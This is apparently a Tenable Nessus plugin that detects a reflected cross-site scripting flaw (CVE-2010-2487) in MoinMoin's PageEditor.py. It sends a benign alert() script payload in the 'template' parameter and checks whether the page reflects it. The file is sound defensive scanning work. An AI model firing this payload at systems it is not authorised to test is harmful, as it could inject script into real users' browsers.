#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(46817);
  script_version("$Revision: 1.12 $");
  script_cvs_date("$Date: 2016/05/16 14:12:49 $");

  script_cve_id("CVE-2010-2487");
  script_bugtraq_id(40549);
  script_osvdb_id(65065);
  script_xref(name:"Secunia", value:"40043");

  script_name(english:"MoinMoin PageEditor.py template Parameter XSS");
  script_summary(english:"Attempts a non-persistent XSS attack");

  script_set_attribute(attribute:"synopsis", value:
"A wiki application on the remote web server has a cross-site scripting
vulnerability.");
  script_set_attribute(attribute:"description", value:
"The version of MoinMoin running on the remote host is affected by a
cross-site scripting vulnerability in the 'template' parameter of the
'PageEditor.py' script. An unauthenticated, remote attacker,
exploiting this flaw, could execute arbitrary script code in a user's
browser.");
  script_set_attribute(attribute:"see_also", value:"http://moinmo.in/MoinMoinBugs/1.9.2UnescapedInputForThemeAddMsg");
  script_set_attribute(attribute:"solution", value:"Apply the patch from the vendor's advisory.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_cwe_id(20, 74, 79, 442, 629, 711, 712, 722, 725, 750, 751, 800, 801, 809, 811, 864, 900, 928, 931, 990);

  script_set_attribute(attribute:"vuln_publication_date", value:"2010/06/03");
  script_set_attribute(attribute:"patch_publication_date", value:"2010/06/03");
  script_set_attribute(attribute:"plugin_publication_date", value:"2010/06/07");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:moinmo:moinmoin");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses : XSS");

  script_copyright(english:"This script is Copyright (C) 2010-2016 Tenable Network Security, Inc.");

  script_dependencies("moinmoin_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/moinmoin");

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");
include("url_func.inc");

port = get_http_port(default:80);
install = get_install_from_kb(appname:'moinmoin', port:port, exit_on_fail:TRUE);

payload = SCRIPT_NAME + unixtime();
exploit = '<script>alert(\'' + payload + '\')</script>';

exploited = test_cgi_xss(
  port:port,
  dirs:make_list(install['dir']),
  cgi:'/'+payload,
  qs:'action=edit&template='+urlencode(str:exploit),
  pass_str:'<div class="warning">[Template '+exploit + ' not found]',
  ctrl_re:'<li>Edit "' + payload + '"</li>'
);

if (!exploited)
{
  install_url = build_url(qs:install['dir'] + '/', port:port);
  exit(0, "The MoinMoin install at " + install_url + " is not affected.");
}
